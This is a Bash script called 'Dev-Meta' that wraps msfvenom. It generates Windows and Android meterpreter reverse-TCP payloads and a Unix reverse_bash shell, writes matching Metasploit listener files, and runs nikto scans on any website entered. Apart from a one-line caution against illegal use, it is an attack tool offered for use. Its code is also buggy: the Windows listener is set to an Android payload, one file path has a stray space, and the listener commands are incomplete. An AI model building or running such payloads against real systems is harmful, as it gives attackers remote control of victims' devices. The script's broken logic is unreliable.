#!/bin/bash
###################
###########Mamoun benhafsa make this programe Dont copy it on your name please 
#################################Dont use it in elligle thinks 
###################
echo
clear
echo -e "
\e[42m████████▄     ▄████████  ▄█    █▄    ▄▄▄▄███▄▄▄▄      ▄████████     ███        ▄████████ 
\e[41m███   ▀███   ███    ███ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███ 
\e[42m███    ███   ███    █▀  ███    ███ ███   ███   ███   ███    █▀     ▀███▀▀██   ███    ███ 
\e[41m███    ███  ▄███▄▄▄     ███    ███ ███   ███   ███  ▄███▄▄▄         ███   ▀   ███    ███ 
\e[42m███    ███ ▀▀███▀▀▀     ███    ███ ███   ███   ███ ▀▀███▀▀▀         ███     ▀███████████ 
\e[41m███    ███   ███    █▄  ███    ███ ███   ███   ███   ███    █▄      ███       ███    ███ 
\e[41m███   ▄███   ███    ███ ███    ███ ███   ███   ███   ███    ███     ███       ███    ███ 
\e[42m████████▀    ██████████  ▀██████▀   ▀█   ███   █▀    ██████████    ▄████▀     ███    █▀  
                                                                                         V 1.0"

echo -e "++++++Hello in Dev-Meta++++++"
echo "this proggrame made by *mamoun benhafsa* Dont Take And respect My copright please *__* :) :)"
echo 
date
echo -e "First give me your LHOST using ifconfig"
read LHOST
echo "Now give me A port EX: 4444"
read PORT
echo "Select By Nember what you want"
echo "[1] generate windows meterpreter reverse tcp payload +exe+ "
echo "[2] generate apk payload for android"
echo "[3] generate bash reverse_tcp  payload"
echo "[4] Scun valn in website using nikto "
echo "[5] CLEAN !!!!"
echo "[6] ABOUT as !! "
read CLS
case $CLS in 
##############################################################################################################################windows#################
   	1 )
echo "Now we will genrate exe Windows payload on outputs Folder "
    echo
   	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$PORT -o outputs/Dev.exe
   	echo 
    cd metahandlers
    echo 
   	touch Devlisner_windows.rc
echo use exploit/multi/handler >> Devlisner_windows.rc
echo set PAYLOAD android/meterpreter/reverse_tcp >> Devlisner_windows.rc
echo set LHOST $LHOST >> Devlisner_windows.rc
echo set LPORT $PORT >> Devlisner_windows.rc
echo "You can listen using command  msfconsole -r Devlisner_windows"
cd ..
echo
clear
echo 
./start.sh
   	;;
###############################################################################################################################android#################
   	2)
echo "Now we will generate apk payload on outputs Folder"
echo
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$PORT -o outputs/Dev.apk
    echo
    cd metahandlers
    echo
    touch Devlisner_android.rc
echo use exploit/multi/handler >> Devlisner_android.rc
echo set PAYLOAD android/meterpreter/reverse_tcp >> Devlisner_android.rc
echo set LHOST $LHOST >> Devlisner_android.rc
echo set LPORT $PORT >> Devlisner_android.rc
echo "You can listen using command  msfconsole -r Devlisner_android"
cd ..
echo
clear
echo 
./start.sh
    ;;
############################################################################################################################""bash#######################
    3)
    echo "Now we will generate Bash payload on outputs Folder"
    echo
    msfvenom -p cmd/unix/reverse_bash 	LHOST=$LHOST LPORT=$PORT -o outputs/Dev.sh
    echo
    cd metahandlers
    echo
    touch Devlisner_bash.rc
echo use exploit/multi/handler >> Devlisner_bash.rc
echo set PAYLOAD cmd/unix/reverse_bash >> Devlisner_bash.rc
echo set LHOST $LHOST >> Devlisner_bash.rc
echo set LPORT $PORT >> Devlisner_bash.rc
echo "You can listen using command  msfconsole -r Devlisner_bash"
cd ..
echo
clear
echo 
./start.sh
    ;;
#####################################################################################################################Nikto################################
    4)
echo "Put the adress of the website you want to scan "
read website
echo "Report will save at outputs folder Dev_roport.htm"
echo 
nikto -h $website -o outputs/Dev_roport.htm
echo
firefox-esr /root/Desktop/Dev-meta/outputs/Dev_roport.htm
echo "Good luck for find vuln"
echo
clear
echo 
./start.sh
   ;; 
################################################################################################################clean#######################################   
    5)
echo "We are cleaning "
rm outputs/Dev.exe
echo
rm outputs/Dev.apk
echo
rm outputs/Dev.sh
echo
rm metahandlers/Devlisner_windows. rc
echo
rm metahandlers/Devlisner_android.rc
echo
rm metahandlers/Devlisner_bash.rc
echo
rm outputs/Dev_roport.htm
    ;; 
    6)
echo 
firefox-esr /root/Desktop/Dev-meta/html/whous.html
   ;;
esac
echo
clear
echo 
./start.sh
